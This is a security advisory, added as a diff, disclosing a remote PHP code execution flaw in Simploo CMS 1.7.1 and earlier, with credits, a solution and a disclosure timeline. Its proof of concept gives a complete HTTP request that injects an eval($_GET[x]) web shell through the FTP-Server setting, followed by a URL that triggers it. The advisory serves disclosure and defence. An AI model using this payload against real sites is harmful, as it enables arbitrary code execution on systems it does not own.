@@ -1,0 +1,78 @@
+Simploo CMS Community Edition - Remote PHP Code Execution Issue
+
+Details
+=============
+Product: Simploo CMS Community Edition
+Security-Risk: moderated
+Remote-Exploit: yes
+Vendor-URL: http://www.simploo.de/
+Advisory-Status: published
+
+Credits
+=============
+Discovered by: David Vieira-Kurz of MajorSecurity
+
+Affected Products:
+=============
+Simploo CMS 1.7.1 and prior
+
+Description
+=============
+"Simploo CMS is a content management system (CMS)."
+
+More Details
+=============
+I have discovered some vulnerabilities in Simploo CMS, which can be
+exploited by malicious people to compromise a vulnerable system.
+Input passed via the "FTP-Server" field when editing FTP options is not
+properly sanitised in lib/Simploo/Config/Writer/Ini.php before being
+saved to the config/custom/base.ini.php file. This can be exploited to
+inject and execute arbitrary PHP code via a specially crafted parameter
+value. Successful exploitation requires "write" privileges.
+
+Proof of Concept
+=============
+POST /simploo/index.php/sicore/updates/optionssave HTTP/1.1
+Host: localhost User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de;
+rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6
+Accept: application/json, text/javascript, */*
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate Accept-Charset:
+ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest Referer:
+http://localhost/simploo/index.php/sifront/page/show/%5Bdraft%5D1
+Cookie: PHPSESSID=r87k31lhqmbp9707io8r6qr2p6;
+si_admin_selected=si_tree_settings_updates_options;
+si_admin_open=si_tree_settings_general%2Csi_tree_settings_general_system%2Csi_tree_settings_updates%2Csi_tree_settings_bemodules%2Csi_tree_settings_contentelements
+Pragma: no-cache Cache-Control: no-cache Content-Length: 105
+ftpenable=&ftpserver=*%2F+eval%28%24_GET%5Bx%5D%29%3B%2F*&ftpuser=&ftppass=&ftppasv=0&ftpssl=0&ftpremote=
+
+Exploit
+=============
+http://localhost/simploo/config/custom/base.ini.php?x=phpinfo%28%29;
+
+Solution
+=============
+Edit the source code to ensure that input is properly sanitised.
+
+Timeline
+================
+2010-07-16, vulnerability identified
+2010-07-17, vendor contacted and asked for pgp key
+2010-07-19, vendor sent his pgp key
+2010-07-20, vulnerability sent to vendor
+2011-01-18, advisory published after 6 month
+
+Use of terms
+================
+Unaltered electronic reproduction of this advisory is permitted. For all
+other reproduction or publication, in printing or otherwise, contact us
+for permission. Use of the advisory constitutes acceptance for use in an
+"as is" condition. All warranties are excluded. In no event shall
+MajorSecurity be liable for any damages whatsoever including direct,
+indirect, incidental, consequential, loss of business profits or special
+damages, even if MajorSecurity has been advised of the possibility of
+such damages.
